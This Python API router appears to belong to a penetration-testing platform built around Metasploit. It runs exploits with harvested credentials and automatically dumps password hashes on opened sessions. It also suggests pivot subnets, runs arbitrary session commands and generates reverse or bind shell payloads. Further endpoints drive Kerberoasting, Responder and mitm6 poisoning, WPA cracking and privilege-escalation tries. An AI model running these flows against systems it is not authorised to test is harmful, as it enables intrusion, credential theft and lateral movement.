    background.add_task(_run_attack, job, req, msf)
    return {"job_id": job_id, "status": "queued"}


def _run_attack(job: dict[str, Any], req: AttackRequest, msf: MsfClient) -> None:
    from services.attack import AttackService

    svc = AttackService(msf, progress=lambda m, p: _update(job, message=m))
    known = _attack_cache.get(req.target) or []
    # credential-driven modules unlock with verified creds from password attacks
    for cred in _load_found_creds(host=req.host or req.target, port=req.port):
        known.append(
            {
                "host": cred["host"],
                "service": cred["service"],
                "user": cred["user"],
                "password": cred["password"],
                "verified": True,
            }
        )
    if any(c.get("verified") for c in known):
        _update(
            job,
            message="running exploit modules (verified credentials available)",
        )
    _update(job, status="running")
    try:
        attacks = svc.run(req, known)
        opened = _record_sessions(attacks)
        for a in opened:
            recon = _post_exploit_recon(a["session_id"])
            a["recon"] = recon
        if opened:
            n = len(opened)
            _update(
                job,
                status="done",
                message=f"attack complete — {n} session(s) opened, quick recon captured",
            )
            _update(job, attacks=attacks)
        else:
            _update(job, attacks=attacks, status="done", message="attack complete")
    except Exception as exc:  # pragma: no cover - defensive
        logger.exception("attack job failed")
        _update(job, status="error", error=str(exc), message="attack failed")


def _load_found_creds(host: str | None, port: int | None) -> list[dict[str, Any]]:
    """Verified credentials from the password-attack card, host/service aware."""
    conn = _neighbor_db()
    if host and port:
        rows = conn.execute(
            "SELECT host, port, service, user, password FROM found_creds WHERE host = ? AND port = ?",
            (host, port),
        ).fetchall()
    elif host:
        rows = conn.execute(
            "SELECT host, port, service, user, password FROM found_creds WHERE host = ?",
            (host,),
        ).fetchall()
    else:
        rows = conn.execute(
            "SELECT host, port, service, user, password FROM found_creds"
        ).fetchall()
    conn.close()
    return [
        {"host": r[0], "port": r[1], "service": r[2], "user": r[3], "password": r[4]}
        for r in rows
    ]


def _record_sessions(attacks: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Persist sessions opened by successful exploits into the neighbors DB,
    then run the standard post-exploit recon set on each and store the output."""
    from datetime import UTC, datetime

    opened: list[dict[str, Any]] = []
    conn = _neighbor_db()
    now = datetime.now(UTC).isoformat()
    for a in attacks:
        sid = a.get("session_id")
        if a.get("result") == "success" and sid:
            logger.warning(
                "[attack] SESSION OPENED on %s via %s (msf session %s)",
                a.get("host"),
                a.get("module"),
                sid,
            )
            conn.execute(
                "INSERT OR REPLACE INTO exploit_sessions (msf_session_id, host, port, module, opened_at) "
                "VALUES (?, ?, ?, ?, ?)",
                (str(sid), a.get("host", ""), a.get("port"), a.get("module"), now),
            )
            opened.append(a)
    conn.commit()
    conn.close()
    return opened


def _post_exploit_recon(msf_session_id: str) -> dict[str, str]:
    """Run the standard proof-of-access set on a fresh session.

    sysinfo/getuid prove code execution; hashdump is where the next move
    lives. Output is stored so the report can show what the session yielded.
    """
    results: dict[str, str] = {}
    conn = _neighbor_db()
    conn.execute(
        "CREATE TABLE IF NOT EXISTS session_recon ("
        "  msf_session_id TEXT NOT NULL,"
        "  command        TEXT NOT NULL,"
        "  output         TEXT NOT NULL,"
        "  at             TEXT NOT NULL,"
        "  PRIMARY KEY (msf_session_id, command)"
        ")"
    )
    conn.commit()
    msf = _get_msf()
    if msf is None:
        conn.close()
        return results
    sess = None
    try:
        sess = msf.client.sessions.session(str(msf_session_id))
    except Exception:
        sess = None
    if sess is None:
        conn.close()
        return results
    for cmd in ("sysinfo", "getuid", "ifconfig", "hashdump"):
        with suppress(Exception):
            out = str(sess.run_shell_cmd(cmd))[:600]
        if out:
            results[cmd] = out
            conn.execute(
                "INSERT OR REPLACE INTO session_recon (msf_session_id, command, output, at) "
                "VALUES (?, ?, ?, ?)",
                (str(msf_session_id), cmd, out, datetime.now(UTC).isoformat()),
            )
    # pivot suggestion: subnets reachable through this session that the
    # session store has not seen yet — surfaced to the operator, never scanned
    import re

    ifcfg = results.get("ifconfig") or ""
    subnets: list[str] = []
    known_hosts: set[str] = set()
    try:
        c2 = _neighbor_db()
        known_hosts = {
            r[0] for r in c2.execute("SELECT ip FROM discovered_hosts").fetchall()
        }
        c2.close()
    except Exception:
        pass
    for ip_match in re.findall(
        r"(?:inet addr:?|inet )((?:\d{1,3}\.){3}\d{1,3})", ifcfg
    ):
        ip = ip_match.strip()
        parts = ip.split(".")
        if ip in known_hosts or ip.startswith(("127.", "10.7.")):
            continue
        if len(parts) == 4 and all(p.isdigit() for p in parts):
            subnets.append(".".join(parts[:3]) + ".0/24")
    subnets = list(dict.fromkeys(subnets))[:3]
    if subnets:
        results["pivot_subnets"] = ",".join(subnets)
        logger.info(
            "[pivot] session %s exposes new subnet(s): %s",
            msf_session_id,
            ", ".join(subnets),
        )
    conn.commit()
    conn.close()
    return results


@router.get("/attack/{job_id}")
def attack_status(job_id: str) -> dict[str, Any]:
    job = _attack_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="attack job not found")
    return job


# ---- session console --------------------------------------------------------


@router.get("/sessions")
def list_sessions() -> dict[str, Any]:
    """Live MSF sessions + sessions recorded from this session's own exploits."""
    msf = _get_msf()
    live: list[dict[str, Any]] = []
    if msf is not None:
        with suppress(Exception):
            for sid, info in (msf.sessions() or {}).items():
                live.append(
                    {
                        "msf_session_id": str(sid),
                        "host": info.get("target_host") or info.get("host") or "",
                        "type": info.get("type") or info.get("info") or "",
                        "source": "msf",
                    }
                )
    recorded: list[dict[str, Any]] = []
    conn = _neighbor_db()
    try:
        rows = conn.execute(
            "SELECT msf_session_id, host, port, module, opened_at FROM exploit_sessions"
        ).fetchall()
        recorded = [
            {
                "msf_session_id": r[0],
                "host": r[1],
                "port": r[2],
                "module": r[3],
                "source": "recorded",
            }
            for r in rows
        ]
    finally:
        conn.close()
    known = {s["msf_session_id"] for s in live}
    for s in live:
        s["alive"] = True
    # Recorded sessions outlive msfrpcd restarts and dead handlers: keep them
    # as history, but never present a dead one as usable. The operator re-enters
    # via propagation or a fresh exploit (see the Persist phase).
    merged = live + [
        {**r, "alive": False} for r in recorded if r["msf_session_id"] not in known
    ]
    return {"sessions": merged, "count": len(merged)}


@router.post("/sessions/{msf_session_id}/cmd")
def session_cmd(msf_session_id: str, req: dict[str, Any]) -> dict[str, Any]:
    """Run a command on an open session (post-exploit console)."""
    msf = _get_msf()
    if msf is None:
        raise HTTPException(status_code=503, detail="msf unavailable")
    cmd = (req.get("command") or "").strip()
    if not cmd:
        raise HTTPException(status_code=422, detail="command required")

    try:
        sess = msf.client.sessions.session(msf_session_id)
    except Exception as exc:
        raise HTTPException(status_code=404, detail=f"no such session: {exc}") from exc
    if sess is None:
        raise HTTPException(status_code=404, detail="session closed or unknown")

    try:
        if hasattr(sess, "run_shell_cmd"):
            out = sess.run_shell_cmd(cmd)
            return {
                "session": msf_session_id,
                "command": cmd,
                "output": (out or "")[:4000],
            }
        # plain shell session: interactive read/write
        sess.write(cmd.encode() if isinstance(cmd, str) else cmd)
        import time as _time

        buf: str = ""
        deadline = _time.time() + 6
        while _time.time() < deadline:
            chunk = sess.read()
            if chunk:
                buf += chunk
                if _time.time() > deadline - 1:
                    break
            else:
                _time.sleep(0.4)
        return {"session": msf_session_id, "command": cmd, "output": buf[:4000]}
    except Exception as exc:
        raise HTTPException(
            status_code=500, detail=f"session command failed: {exc}"
        ) from exc


_toolkit_jobs: dict[str, dict[str, Any]] = {}


@router.post("/payload")
def generate_payload(req: dict[str, Any]) -> dict[str, Any]:
    """OPT-IN helper: render an msfvenom payload offline (no target touched).

    Used to stage bind/reverse shells for manual triggers
    (e.g. {"payload": "php/bind_php", "options": {"LPORT": 4445}}).
    Generation is local; *using* the payload is the aggressive step.
    """
    import re as _re

    from services.toolkit import ToolkitRunner

    payload = str(req.get("payload") or "").strip()
    if not _re.fullmatch(r"[A-Za-z0-9_/\-]+", payload):
        raise HTTPException(
            status_code=422, detail="payload required (e.g. php/bind_php)"
        )
    fmt = str(req.get("format") or "raw")
    if not _re.fullmatch(r"[A-Za-z0-9]+", fmt):
        raise HTTPException(status_code=422, detail="bad format")
    options = req.get("options") or {}
    if not isinstance(options, dict):
        raise HTTPException(status_code=422, detail="options must be an object")
    argv = ["msfvenom", "-p", payload]
    for key, val in options.items():
        if not _re.fullmatch(r"[A-Za-z0-9_]+", str(key)) or not _re.fullmatch(
            r"[\w.\-]+", str(val)
        ):
            raise HTTPException(status_code=422, detail=f"bad option {key!r}")
        argv += [f"{key}={val}"]
    argv += ["-f", fmt]
    runner = ToolkitRunner()
    result = runner.run_tool("msfvenom", argv, timeout=120)
    out = result["stdout"] + result["stderr"]
    return {
        "payload": payload,
        "format": fmt,
        "options": {k: str(v) for k, v in options.items()},
        "stdout": out[:20000],
        "rc": result["rc"],
        "timed_out": result["timed_out"],
        "status": result["status"],
    }


@router.post("/deepattack")
def deep_attack(req: DeepAttackRequest, background: BackgroundTasks) -> dict[str, Any]:
    """OPT-IN only: deeper non-Metasploit toolkit sweep (brute force, web vuln,
    smb enum, sqlmap, dns) via a separate toggle. Authorized scope only."""
    host = req.host or req.target
    job_id = uuid.uuid4().hex[:12]
    job = {
        "id": job_id,
        "target": req.target,
        "host": host,
        "services": req.services,
        "status": "queued",
        "results": [],
        "created": datetime.now(UTC).isoformat(),
    }
    _toolkit_jobs[job_id] = job
    background.add_task(_run_deep_attack, job, req, host)
    return {"job_id": job_id, "status": "queued"}


def _run_deep_attack(job: dict[str, Any], req: DeepAttackRequest, host: str) -> None:
    from services.toolkit import ToolkitPlan, ToolkitRunner

    runner = ToolkitRunner(progress=lambda m, p: _update(job, message=m))
    plan = ToolkitPlan.for_target(req)
    results: list[dict] = []
    # Flip to running up front: a hydra sweep runs for minutes and without this
    # the job reads "queued" for the whole of it.
    _update(job, status="running", message=f"running {len(plan)} toolkit step(s)")
    try:
        for step in plan:
            tool = step["tool"]
            # tag each result with the service it targets
            service = _service_for_tool(tool)
            out = runner.run_tool(tool, step["argv"])
            results.append(
                {
                    **out,
                    "host": host,
                    "service": service,
                }
            )
            # publish partial results so the monitor shows progress per tool
            _update(job, results=results)
        _update(job, status="done", message=f"{len(results)} toolkit step(s) complete")
    except Exception as exc:  # pragma: no cover - defensive
        # Without this a crashed sweep stays "running" forever in the monitor.
        logger.exception("deep toolkit sweep failed")
        _update(job, status="error", error=str(exc), results=results)


@router.get("/deepattack/{job_id}")
def deep_attack_status(job_id: str) -> dict[str, Any]:
    job = _toolkit_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="deep-attack job not found")
    return job


_fuzz_jobs: dict[str, dict[str, Any]] = {}


@router.post("/fuzz")
def run_fuzz(req: FuzzRequest, background: BackgroundTasks) -> dict[str, Any]:
    """LAB-ONLY: fuzz a service you own to surface NEW bug candidates.

    Mutates input vectors toward the target and flags connection teardown,
    server errors, hangs, or service-loss as potential bug candidates for
    responsible disclosure. Must target a host you control.
    """
    if not (req.host or req.target):
        raise HTTPException(status_code=400, detail="no target")
    host = req.host or req.target
    port = req.port or (443 if req.scheme == "https" else 80)
    job_id = uuid.uuid4().hex[:12]
    job = {
        "id": job_id,
        "target": req.target,
        "host": host,
        "service": req.service,
        "port": port,
        "iterations": req.iterations,
        "status": "running",
        "candidates": [],
        "created": datetime.now(UTC).isoformat(),
    }
    _fuzz_jobs[job_id] = job
    background.add_task(_run_fuzz, job, req, host, port)
    return {"job_id": job_id, "status": "running"}


def _run_fuzz(job: dict[str, Any], req: FuzzRequest, host: str, port: int) -> None:
    if job.get("status") == "queued":
        _update(job, status="running", message="fuzzing")
    from services.fuzzer import LabFuzzer

    fuzzer = LabFuzzer(
        progress=lambda msg, pct: _update(job, message=msg, progress=pct),
        timeout=req.timeout,
        iterations=req.iterations,
    )
    try:
        candidates = fuzzer._fuzz_http(host, port, req.scheme)
        # `count` is the number of DISTINCT crashes, not inputs executed.
        # Dedup happens in CrashRegistry; counting raw execs here is what
        # makes a fuzzer look like it found 40000 bugs when it found 1.
        job["candidates"] = candidates
        job["count"] = len(candidates)
        job["stats"] = fuzzer.stats
        _update(job, status="done", progress=100.0, message="fuzz complete")
    except Exception as exc:  # pragma: no cover - defensive
        logger.exception("fuzz job failed")
        _update(job, status="error", error=str(exc), message="fuzz failed")


@router.get("/fuzz/{job_id}")
def fuzz_status(job_id: str) -> dict[str, Any]:
    job = _fuzz_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="fuzz job not found")
    return job


@router.post("/fuzz/{job_id}/abort")
def fuzz_abort(job_id: str) -> dict[str, Any]:
    job = _fuzz_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="fuzz job not found")
    job["status"] = "abort_requested"
    logger.info("[fuzz %s] abort requested", job_id)
    return {"status": "abort_requested"}


_cfuzz_jobs: dict[str, dict[str, Any]] = {}


@router.post("/container_surfaces")
def container_surfaces(req: dict[str, Any]) -> dict[str, Any]:
    """Read-only inventory of fuzzable container runtimes (no packets mutated)."""
    from services.container_fuzz import detect_surfaces

    target = str((req or {}).get("target") or "127.0.0.1")
    return detect_surfaces(target)


@router.post("/container_fuzz", response_model=ContainerFuzzResult)
def run_container_fuzz(
    req: ContainerFuzzRequest, background: BackgroundTasks
) -> ContainerFuzzResult:
    """LAB-ONLY: fuzz a container surface you own (Docker API, kubelet,
    containerd framing, or generic HTTP endpoints).

    Read-only GET shapes by default; `allow_mutating` adds POST shapes.
    Runs as a background job like /fuzz — poll `/api/container_fuzz/{id}`.
    """
    surface = (req.surface or "docker").strip().lower()
    if surface not in ("docker", "kubelet", "grpc", "http"):
        raise HTTPException(
            status_code=400, detail="surface must be docker|kubelet|grpc|http"
        )
    if surface in ("docker", "grpc") and (req.target or "").strip() not in (
        "127.0.0.1",
        "localhost",
        "::1",
    ):
        raise HTTPException(
            status_code=400,
            detail="docker/grpc fuzzing is local-only (unix socket)",
        )
    job_id = uuid.uuid4().hex[:12]
    job = {
        "id": job_id,
        "surface": surface,
        "target": req.target,
        "status": "running",
        "candidates": [],
        "created": datetime.now(UTC).isoformat(),
    }
    _cfuzz_jobs[job_id] = job
    background.add_task(_run_container_fuzz, job, req, surface)
    return ContainerFuzzResult(job_id=job_id, status="running")


def _run_container_fuzz(
    job: dict[str, Any], req: ContainerFuzzRequest, surface: str
) -> None:
    if job.get("status") == "queued":
        _update(job, status="running", message="container fuzzing")
    from services.container_fuzz import fuzz_surface

    try:
        result = fuzz_surface(
            surface,
            target=req.target,
            port=req.port,
            endpoints=req.endpoints,
            iterations=req.iterations,
            timeout=req.timeout,
            seed=req.seed,
            allow_mutating=req.allow_mutating,
            progress=lambda msg, pct: _update(job, message=msg, progress=pct),
        )
        job["candidates"] = result["candidates"]
        job["count"] = result["count"]
        job["stats"] = result["stats"]
        job["transport"] = result["transport"]
        _update(job, status="done", progress=100.0, message="container fuzz complete")
    except Exception as exc:  # pragma: no cover - defensive
        logger.exception("container fuzz job failed")
        _update(job, status="error", error=str(exc), message="container fuzz failed")


@router.get("/container_fuzz/{job_id}")
def container_fuzz_status(job_id: str) -> dict[str, Any]:
    job = _cfuzz_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="container fuzz job not found")
    return job


@router.post("/container_fuzz/{job_id}/abort")
def container_fuzz_abort(job_id: str) -> dict[str, Any]:
    job = _cfuzz_jobs.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="container fuzz job not found")
    job["status"] = "abort_requested"
    logger.info("[container_fuzz %s] abort requested", job_id)
    return {"status": "abort_requested"}


@router.post("/vulnleads")
def vuln_leads(req: VulnLeadsRequest) -> dict[str, Any]:
    """Scan discovered services for outdated / EOL / beta version leads."""
    from services.vulnleads import analyze_service

    msf = _get_msf()
    leads: list[dict] = []
    # pull hosts+services from the DB so we can inspect banners
    if msf is not None:
        try:
            ws = msf.current_workspace() or "default"
            for rec in msf.services(ws):
                if not _target_matches_svc(rec, req.target):
                    continue
                leads.extend(
                    analyze_service(
                        str(rec.get("host") or ""),
                        rec.get("name") or "",
                        rec.get("info") or "",
                    )
                )
        except Exception as exc:
            logger.warning("vulnleads failed: %s", exc)
    return {"target": req.target, "leads": leads, "count": len(leads)}


def _target_matches_svc(rec: dict[str, Any], target: str) -> bool:
    import ipaddress

    try:
        net = ipaddress.ip_network(target, strict=False)
        return str(rec.get("host") or "") in {str(x) for x in net}  # pragma: no cover
    except ValueError:
        return str(rec.get("host") or "") == target or target in str(
            rec.get("host") or ""
        )


# ---- CTF / lab toolkit (opt-in) ------------------------------------------
# Read-only detectors (container escape, lateral map, DB interrogation) and
# explicitly-invoked scanners. Kept separate from the scan pipeline so a plain
# scan never triggers a web scan, hash crack or wireless capture.


@router.post("/zap", response_model=ZapResult)
def zap_scan_api(req: ZapRequest) -> ZapResult:
    """OWASP ZAP web-application scan (spider + active). Authorized web apps."""
    from services.zap import zap_scan

    return ZapResult(**zap_scan(req.target, mode=req.mode))


@router.post("/john", response_model=JohnResult)
def john_crack(req: JohnRequest) -> JohnResult:
    """Crack hashes with John the Ripper over a bounded set of formats."""
    from services.john import JohnRunner

    result = JohnRunner().crack_ctf_hashes(
        req.hashes,
        formats=req.formats,
        wordlist=req.wordlist,
        max_time_per_format=req.max_time_per_format,
    )
    return JohnResult(**result)


@router.post("/aircrack", response_model=AircrackResult)
def aircrack_assessment(req: AircrackRequest) -> AircrackResult:
    """Aircrack-ng wireless assessment: scan, capture, (optionally) crack."""
    from services.aircrack import AircrackRunner

    result = AircrackRunner().full_wpa_assessment(
        req.interface,
        req.target_essid,
        req.wordlist,
        capture_duration=req.capture_duration,
    )
    result.setdefault("interface", req.interface)
    return AircrackResult(**result)


@router.post("/tshark/pcap", response_model=TsharkResult)
def tshark_pcap_analysis(req: TsharkRequest) -> TsharkResult:
    """Full pcap analysis: flows, credentials, anomalies, extracted files."""
    from services.tshark import TsharkRunner

    if not req.pcap_file:
        raise HTTPException(status_code=400, detail="pcap_file required")
    return TsharkResult(**TsharkRunner().full_pcap_analysis(req.pcap_file))


@router.post("/tshark/live", response_model=TsharkResult)
def tshark_live_capture(req: TsharkRequest) -> TsharkResult:
    """Capture live traffic on an interface, then analyze it."""
    from services.tshark import TsharkRunner

    if not req.interface:
        raise HTTPException(status_code=400, detail="interface required")
    result = TsharkRunner().live_capture_analysis(
        req.interface, req.duration, req.filter
    )
    return TsharkResult(**result)


@router.post("/nmap/nse", response_model=NmapNSEResult)
def nmap_nse_scan(req: NmapNSERequest) -> NmapNSEResult:
    """Nmap with NSE vulnerability scripts (vuln/auth/default by default).

    Explicit run only: nothing suggests or fires scripts on its own. Use
    `GET /api/nse/suggest` first to pick scripts for a fingerprinted service.
    """
    from services.toolkit import ToolkitRunner

    argv = ["nmap", "-sV", "-sC", "--script", req.scripts, f"-{req.timing}"]
    if req.ports:
        argv += ["-p", req.ports]
    argv.append(req.target)
    out = ToolkitRunner().run_tool("nmap_nse", argv, timeout=600)
    return NmapNSEResult(target=req.target, tool=out)


@router.post("/tls/fingerprint", response_model=TlsFingerprintResult)
def tls_fingerprint_api(req: TlsFingerprintRequest) -> TlsFingerprintResult:
    """Active TLS fingerprint of one host you own (opt-in).

    Handshake inventory (version/cipher/cert) + exact-match watchlist and
    heuristic C2 leads. Sandbox returns a canned fingerprint.
    """
    from services import sandbox as sandbox_mode
    from services.tls_fingerprint import sandbox_scan, scan_host

    if sandbox_mode.enabled():
        return TlsFingerprintResult(**sandbox_scan(req.target))
    return TlsFingerprintResult(
        host=req.target,
        **{
            k: v
            for k, v in scan_host(
                req.target,
                ports=req.ports,
                timeout=req.timeout,
                watchlist=req.watchlist,
            ).items()
            if k != "host"
        },
    )


@router.post("/tls/inventory", response_model=TlsInventoryResult)
def tls_inventory_api(req: TlsInventoryRequest) -> TlsInventoryResult:
    """TLS cert inventory over host[:port] targets you own (opt-in).

    Expiry (<30d), expired, self-signed and weak-crypto leads, ledgered
    as vulns with `engagement_id` (scope-enforced). Sandbox is canned.
    """
    from services import sandbox as sandbox_mode
    from services.cert_inventory import inventory, sandbox_inventory

    if sandbox_mode.enabled():
        result = sandbox_inventory(req.targets)
    else:
        result = inventory(req.targets, timeout=req.timeout, watchlist=req.watchlist)
    ingested = 0
    skipped: list[str] = []
    if req.engagement_id:
        from routers.engagement import get_store
        from services.engagement import ScopeError

        store = get_store()
        if not store.get_engagement(req.engagement_id):
            from fastapi import HTTPException

            raise HTTPException(status_code=404, detail="engagement not found")
        for entry in result.get("entries", []):
            if not entry.get("ok") or not entry.get("leads"):
                continue
            for lead in entry["leads"]:
                try:
                    ingested += store.record_vuln(
                        req.engagement_id,
                        entry["host"],
                        {
                            "name": f"TLS: {lead['lead']}",
                            "severity": lead["level"],
                            "cwe": "CWE-327",
                            "module": "tls-inventory",
                            "reference": entry.get("fingerprint", ""),
                        },
                    )
                except ScopeError:
                    if entry["host"] not in skipped:
                        skipped.append(entry["host"])
    return TlsInventoryResult(
        **{**result, "ingested": ingested, "skipped_out_of_scope": skipped}
    )


@router.get("/nse/suggest")
def nse_suggest(service: str = "", product: str = "") -> dict[str, Any]:
    """Suggest NSE scripts for a fingerprinted service (offline, read-only)."""
    from services.nse_suggest import suggest

    return suggest(service, product)


@router.get("/nse/services")
def nse_services() -> dict[str, Any]:
    """Service names with curated NSE suggestions."""
    from services.nse_suggest import services_covered

    covered = services_covered()
    return {"services": covered, "count": len(covered)}


@router.post("/nikto", response_model=NiktoResult)
def nikto_scan_api(req: NiktoRequest) -> NiktoResult:
    """Standalone nikto web scan (also runs inside deepattack/autopilot)."""
    from services.toolkit import ToolkitRunner

    if not (req.target or "").strip():
        raise HTTPException(status_code=400, detail="target required")
    argv = ["nikto", "-host", req.target, "-maxtime", f"{max(1, req.maxtime)}s"]
    if (req.tuning or "").strip():
        argv += ["-Tuning", req.tuning.strip()]
    out = ToolkitRunner().run_tool("nikto", argv, timeout=900)
    return NiktoResult(target=req.target, tool=out)


@router.post("/gobuster", response_model=GobusterResult)
def gobuster_scan_api(req: GobusterRequest) -> GobusterResult:
    """Standalone gobuster content discovery (also runs inside deepattack)."""
    from services.toolkit import COMMON_WORDLIST, ToolkitRunner

    if not (req.target or "").strip():
        raise HTTPException(status_code=400, detail="target required")
    mode = (req.mode or "dir").strip().lower()
    if mode not in ("dir", "dns", "vhost", "fuzz"):
        raise HTTPException(status_code=400, detail="mode must be dir|dns|vhost|fuzz")
    argv = [
        "gobuster",
        mode,
        "-u" if mode in ("dir", "vhost", "fuzz") else "-d",
        req.target,
        "-w",
        (req.wordlist or "").strip() or COMMON_WORDLIST,
        "-t",
        str(max(1, req.threads)),
        "-q",
    ]
    if (req.extensions or "").strip() and mode in ("dir", "fuzz"):
        argv += ["-x", req.extensions.strip()]
    out = ToolkitRunner().run_tool("gobuster", argv, timeout=900)
    return GobusterResult(target=req.target, tool=out)


@router.post("/container_escape", response_model=ContainerEscapeResult)
def container_escape_check() -> ContainerEscapeResult:
    """Detect container escape vectors (read-only; never auto-executes)."""
    from services.container_escape import ContainerEscape

    result = ContainerEscape().detect()
    # h4k is also aware of the host-side docker-group-to-root path
    # (labs/docker-group-to-root/): surface it alongside the in-container
    # vectors so the operator sees the full privilege surface in one place.
    try:
        from services.privesc import docker_group_report

        priv = docker_group_report()
        for vec in priv.get("vectors", []):
            if vec not in result["vectors"]:
                result["vectors"].append(vec)
    except Exception:
        pass
    return ContainerEscapeResult(**result)


@router.get("/privesc")
def privesc_check() -> dict[str, Any]:
    """Read-only privilege-surface report (docker-group-to-root awareness)."""
    from services.privesc import docker_group_report

    return docker_group_report()


@router.post("/privesc/try-docker-group")
def privesc_try() -> dict[str, Any]:
    """OPT-IN safe try: prove host-root read via a read-only mount.

    Runs `docker run --rm -v /:/host:ro` + `ls /host/root` only — never
    writes, never execs on the host. Disabled in sandbox mode.
    """
    from services.privesc import try_docker_group_read

    return try_docker_group_read()


@router.post("/privesc/try-userns")
def privesc_try_userns() -> dict[str, Any]:
    """OPT-IN safe try: prove uid 0 via unshare userns (no sudo, no docker).

    Runs `unshare -Urm id` only. Creates nothing, touches no daemon.
    Disabled in sandbox mode. Note: namespace root, not host root.
    """
    from services.privesc import try_userns_root

    return try_userns_root()


@router.get("/privesc/host-audit")
def privesc_host_audit() -> dict[str, Any]:
    """Read-only host privesc audit: SUID, file caps, writable sensitive.

    Uses no sudo and never touches docker. Returns either a concrete
    host-root vector or an explicit no-vector verdict for the scope.
    """
    from services.privesc import host_privesc_audit

    return host_privesc_audit()


@router.post("/nuclei", response_model=NucleiResult)
def nuclei_scan_api(req: NucleiRequest) -> NucleiResult:
    """Fast template-based vulnerability scan with nuclei (opt-in).

    `offline=True` runs only the bundled templates. `engagement_id` records
    findings as vulns in that engagement (scope-enforced ledger).
    """
    from services import sandbox as sandbox_mode
    from services.nuclei import nuclei_scan, sandbox_result, to_ledger

    if sandbox_mode.enabled():
        result = sandbox_result(req.target)
    else:
        result = nuclei_scan(
            req.target,
            templates=req.templates,
            severity=req.severity,
            offline=req.offline,
            **req.options,
        )
    ingested = 0
    skipped: list[str] = []
    if req.engagement_id:
        from routers.engagement import get_store
        from services.engagement import ScopeError

        store = get_store()
        if not store.get_engagement(req.engagement_id):
            from fastapi import HTTPException

            raise HTTPException(status_code=404, detail="engagement not found")
        for entry in to_ledger(req.target, result.get("findings") or []):
            try:
                ingested += store.record_vuln(req.engagement_id, entry["host"], entry)
            except ScopeError:
                if entry["host"] not in skipped:
                    skipped.append(entry["host"])
    return NucleiResult(
        **{
            **result,
            "target": req.target,
            "ingested": ingested,
            "skipped_out_of_scope": skipped,
        }
    )


@router.get("/nuclei/templates")
def nuclei_templates() -> dict[str, Any]:
    """The offline nuclei template bundle (no network fetch)."""
    from services.nuclei import bundle_dir, bundle_templates

    bdir = bundle_dir()
    return {
        "bundle": str(bdir) if bdir else None,
        "templates": bundle_templates(),
        "count": len(bundle_templates()),
        "offline_ready": bdir is not None,
    }


@router.post("/sqlmap", response_model=SqlmapResult)
def sqlmap_scan_api(req: SqlmapRequest) -> SqlmapResult:
    """Automated SQL injection detection and exploitation."""
    from services.sqlmap import sqlmap_scan

    return SqlmapResult(**sqlmap_scan(req.url, **req.options))


@router.post("/ad/bloodhound")
def ad_bloodhound_collect(req: ADBloodhoundRequest) -> dict[str, Any]:
    """Collect AD data with BloodHound.py."""
    from services.ad_tools import bloodhound_collect

    return bloodhound_collect(req.domain, req.username, req.password, **req.options)


@router.post("/ad/mitm6")
def ad_mitm6_attack(req: ADMitm6Request) -> dict[str, Any]:
    """IPv6 MITM attack with mitm6."""
    from services.ad_tools import mitm6_attack

    return mitm6_attack(req.interface, **req.options)


@router.post("/kerberos/asrep", response_model=KerberosRoastResult)
def kerberos_asrep(req: KerberosRoastRequest) -> KerberosRoastResult:
    """AS-REP roast: request hashes for no-preauth users (explicit, opt-in)."""
    from services import sandbox as sandbox_mode
    from services.kerberos import KerberosService, crack_hashes, sandbox_hashes

    if sandbox_mode.enabled():
        result = sandbox_hashes("asrep")
        kind = "asrep"
    else:
        kind = "asrep"
        result = KerberosService().asrep_roast(
            req.domain, dc_ip=req.dc_ip, users=req.users
        )
    cracked: list[dict[str, Any]] = []
    if req.crack and result.get("hashes") and not sandbox_mode.enabled():
        cracked = crack_hashes(
            result["hashes"], kind, wordlist=req.wordlist, max_time=req.max_time
        ).get("cracked", [])
    return KerberosRoastResult(**{**result, "kind": kind, "cracked": cracked})


@router.post("/kerberos/kerberoast", response_model=KerberosRoastResult)
def kerberos_kerberoast(req: KerberosRoastRequest) -> KerberosRoastResult:
    """Kerberoast: request service-ticket hashes (explicit, opt-in)."""
    from fastapi import HTTPException
    from services import sandbox as sandbox_mode
    from services.kerberos import KerberosService, crack_hashes, sandbox_hashes

    if not req.user and not sandbox_mode.enabled():
        raise HTTPException(status_code=400, detail="user required")
    if sandbox_mode.enabled():
        result = sandbox_hashes("kerberoast")
        kind = "kerberoast"
    else:
        kind = "kerberoast"
        result = KerberosService().kerberoast(
            req.domain, req.user or "", req.password or "", dc_ip=req.dc_ip
        )
    cracked = []
    if req.crack and result.get("hashes") and not sandbox_mode.enabled():
        cracked = crack_hashes(
            result["hashes"],
            "kerberoast",
            wordlist=req.wordlist,
            max_time=req.max_time,
        ).get("cracked", [])
    return KerberosRoastResult(**{**result, "kind": kind, "cracked": cracked})


@router.post("/ad/responder")
def ad_responder_attack(req: ADResponderRequest) -> dict[str, Any]:
    """NTLM/LLMNR/NBNS poisoning with Responder."""
    from services.ad_tools import responder_attack

    return responder_attack(req.interface, **req.options)


@router.post("/lateral")
def lateral_movement(req: LateralRequest) -> dict[str, Any]:
    """Map local interfaces and routes for pivot planning (read-only)."""
    from services.lateral import LateralMovement

    return LateralMovement().discover_network(req.cidr)


@router.post("/db_interrogate")
def db_interrogate(req: DBInterrogateRequest) -> dict[str, Any]:
    """Enumerate local APIs and flag-shaped strings from DBs/configs."""
    from services.db_interrogate import DBInterrogate

    return DBInterrogate().interrogate_all(req.target)


# Fire TV / Android TV toolkit (opt-in; a scan never touches a TV).
def _firetv_target(req: FireTVRequest) -> str:
    if not (req.target or "").strip():
        raise HTTPException(status_code=400, detail="target required")
    return req.target.strip()


@router.post("/firetv/recon", response_model=FireTVResult)
def firetv_recon(req: FireTVRequest) -> FireTVResult:
    """Read-only Fire TV fingerprint: ports + eureka + ADB auth state."""
    from services.firetv import FireTVService

    out = FireTVService().recon(_firetv_target(req))
    return FireTVResult(target=req.target, action="recon", **_firetv_wrap(out))


@router.post("/firetv/mdns", response_model=FireTVResult)
def firetv_mdns(req: FireTVRequest) -> FireTVResult:
    """Listen for Fire TV mDNS announcements (no target needed)."""
    from services.firetv import mdns_discover

    out = mdns_discover(queries=req.queries)
    ok = bool(out.get("success"))
    return FireTVResult(
        target="multicast",
        action="mdns",
        success=ok,
        output=f"{len(out.get('devices', []))} device(s)",
        detail=out,
        error=None if ok else out.get("error"),
    )


